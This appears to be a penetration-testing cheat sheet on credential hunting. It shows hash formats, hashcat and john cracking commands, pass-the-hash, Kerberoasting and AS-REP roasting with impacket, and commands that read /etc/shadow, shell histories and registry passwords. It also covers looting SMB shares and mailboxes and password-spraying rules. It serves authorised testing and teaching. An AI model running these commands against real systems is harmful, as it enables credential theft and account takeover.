# Credential Tracking

Where to find credentials, what they look like, and how to track them across an engagement.

---

## WHAT CREDENTIALS LOOK LIKE

### Plaintext passwords

Found in config files, databases, shares, history files — Use everywhere

```
admin123
P@ssw0rd!
Summer2025!
CompanyName2024
```

---

### NTLM hash

32 hex characters, no salt — Dumped from SAM, secretsdump, mimikatz. Can be cracked (hashcat -m 1000) or used directly with Pass the Hash.

```
aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
│              LM hash             │              NT hash              │
```

<details>
<summary>Example — Full SAM dump format</summary>

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
svc_backup:1001:aad3b435b51404eeaad3b435b51404ee:68510b169745bd23fae40e4a24cb080c:::

Format: username:RID:LM_hash:NT_hash:::
Crack NT hash: hashcat -m 1000 hash.txt rockyou.txt
Pass the Hash: crackmapexec smb $IP -u Administrator -H 8846f7eaee8fb117ad06bdd830b7586c
```
</details>

---

### NTLMv2 hash

Captured from Responder or network sniffing — Must be cracked, cannot Pass the Hash with this

```
john::CORP:1122334455667788:ABC123DEF456789012345678901234567890:0101000000000000...
│user│ │dom│   │challenge │                │NTLMv2 response│
```

<details>
<summary>Example — Responder capture</summary>

```
[SMB] NTLMv2-SSP Client   : 10.10.10.50
[SMB] NTLMv2-SSP Username : CORP\john
[SMB] NTLMv2-SSP Hash     : john::CORP:1122334455667788:a]bc123def456:0101000000000000...

Crack: hashcat -m 5600 hash.txt rockyou.txt
Cannot PtH — must crack to plaintext first
```
</details>

---

### Kerberoast TGS hash

Extracted via GetUserSPNs — Service account hash, often has a weak password

```
$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQL/db01.corp.local*$abc123...
│ prefix │  │ user │  │ domain │     │     SPN       │  │hash│
```

<details>
<summary>Example — Impacket output</summary>

```
impacket-GetUserSPNs corp.local/john:'Password1' -dc-ip 10.10.10.1 -request

ServicePrincipalName    Name      MemberOf
MSSQL/db01.corp.local   svc_sql   CN=Domain Admins

$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQL/db01.corp.local*$f3a5b8c2d1e...

Crack: hashcat -m 13100 hash.txt rockyou.txt
```
</details>

---

### AS-REP hash

From accounts without Kerberos pre-authentication — No creds needed to obtain

```
$krb5asrep$23$svc_backup@CORP.LOCAL:abc123def456...
│  prefix  │  │    user@domain     │   │ hash │
```

<details>
<summary>Example — Impacket output</summary>

```
impacket-GetNPUsers corp.local/ -dc-ip 10.10.10.1 -usersfile users.txt -no-pass

[*] Getting TGT for svc_backup
$krb5asrep$23$svc_backup@CORP.LOCAL:a1b2c3d4e5f6...

Crack: hashcat -m 18200 hash.txt rockyou.txt
```
</details>

---

### Linux password hash (/etc/shadow)

Format depends on algorithm — $1$ (MD5), $5$ (SHA256), $6$ (SHA512)

```
root:$6$randomsalt$longhashstring...:19000:0:99999:7:::
│user│$6│  salt   │    SHA512 hash     │  │password age fields│
```

<details>
<summary>Example — /etc/shadow entries</summary>

```
root:$6$xyz123$A1B2C3D4E5F6G7H8I9J0...:19443:0:99999:7:::
admin:$1$abc$ShortMD5Hash...:19443:0:99999:7:::
www-data:*:19000:0:99999:7:::          ← * means no login

$1$ = MD5        → hashcat -m 500
$5$ = SHA256     → hashcat -m 7400
$6$ = SHA512     → hashcat -m 1800

Crack: unshadow /etc/passwd /etc/shadow > unshadowed.txt
       hashcat -m 1800 unshadowed.txt rockyou.txt
```
</details>

---

### SSH private key

Found in .ssh directories, backups, shares — May be passphrase protected

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIA...
-----END OPENSSH PRIVATE KEY-----
```

<details>
<summary>Usage</summary>

```
chmod 600 id_rsa
ssh -i id_rsa user@$IP

If passphrase protected:
ssh2john id_rsa > ssh.hash
john ssh.hash --wordlist=rockyou.txt
```
</details>

---

### bcrypt hash

From web application databases — Slow to crack, use rules

```
$2y$10$ABC123def456GHI789jkl.MNOPQR012stuvwxYZ345678abcdefgh
│$2y│cost│              22-char salt + 31-char hash              │
```

<details>
<summary>Example</summary>

```
Found in: WordPress wp_users table, web app databases
$2y$10$ or $2a$10$ prefix

Crack: hashcat -m 3200 hash.txt rockyou.txt -r best64.rule
Very slow — use small targeted wordlists with rules
```
</details>

---

## WHERE TO FIND CREDENTIALS

### Configuration files

Always check these paths — Plaintext DB creds, API keys, secret keys

```bash
# Web configs:
cat /var/www/html/wp-config.php
cat /var/www/html/configuration.php
cat /var/www/html/config.php
cat /var/www/html/.env
cat /var/www/html/app/etc/local.xml

# System configs:
cat /etc/shadow
cat /etc/tomcat*/tomcat-users.xml
cat /opt/*/config.yml
```

---

### History files

Check for ALL users — Commands with passwords typed inline

```bash
cat /home/*/.bash_history
cat /root/.bash_history
cat /home/*/.mysql_history
# Windows:
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

---

### HTML source and JavaScript

View source on EVERY page — Hardcoded creds, API tokens, debug info

```bash
curl -s http://$IP/ | grep -iE "password|passwd|secret|token|api.key"
# Check JavaScript files for API keys and endpoints
```

---

### Network shares and file servers

Download and search EVERYTHING — Config backups, credential files, SSH keys

```bash
smbclient //$IP/share -N -c "recurse;prompt;mget *"
grep -r "password" ./loot/ --include="*.txt" --include="*.xml" --include="*.conf"
```

---

### Database tables

SELECT * FROM users — Always check for creds

```bash
# MySQL:
SELECT user,password FROM mysql.user;
SELECT * FROM users;

# MSSQL:
SELECT name, password_hash FROM sys.sql_logins;

# PostgreSQL:
SELECT usename, passwd FROM pg_shadow;
```

---

### Windows registry and saved creds

Autologon, VNC, PuTTY, WiFi passwords

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query HKLM /f password /t REG_SZ /s
cmdkey /list
```

---

### LDAP user descriptions

Admins put temp passwords in AD description fields

```bash
ldapsearch -x -H ldap://$DC_IP -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(description=*pass*)" description sAMAccountName
```

---

### Email / mailboxes

Login with found creds — Password resets, shared credentials

```bash
curl -k "imaps://$IP/INBOX" -u user:password -X "FETCH 1:* BODY[TEXT]" | grep -i password
```

---

### Process command lines

Passwords passed as arguments — Visible via SNMP or ps

```bash
# Linux:
ps aux | grep -i pass

# SNMP:
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.5
```

---

## CREDENTIAL TRACKING MATRIX

Use this template during engagements — Log every credential and where you tried it.

```
┌──────────┬──────────┬──────────┬─────┬─────┬───────┬─────┬─────┬───────┐
│ Username │ Password │ Source   │ SSH │ SMB │ WinRM │ RDP │ Web │ DB    │
├──────────┼──────────┼──────────┼─────┼─────┼───────┼─────┼─────┼───────┤
│ admin    │ admin123 │ FTP conf │  ✓  │  ✓  │   ✗   │  ✗  │  ✓  │       │
│ john     │ NTLMhash │ SAM dump │ n/a │ PtH │  PtH  │     │     │       │
│ svc_sql  │ Summer25 │ Kerbrst  │     │  ✓  │   ✓   │     │     │  ✓    │
│ root     │ $6$hash  │ /shadow  │crack│     │       │     │     │       │
└──────────┴──────────┴──────────┴─────┴─────┴───────┴─────┴─────┴───────┘

Rules:
1. Try EVERY credential on EVERY service
2. Try password reuse across all users
3. Try common mutations: Password1 → Password2, password1!, Password2025
4. Spray Season+Year: Summer2025!, Winter2024!, Spring2025
5. Document what worked and what didn't
```

---
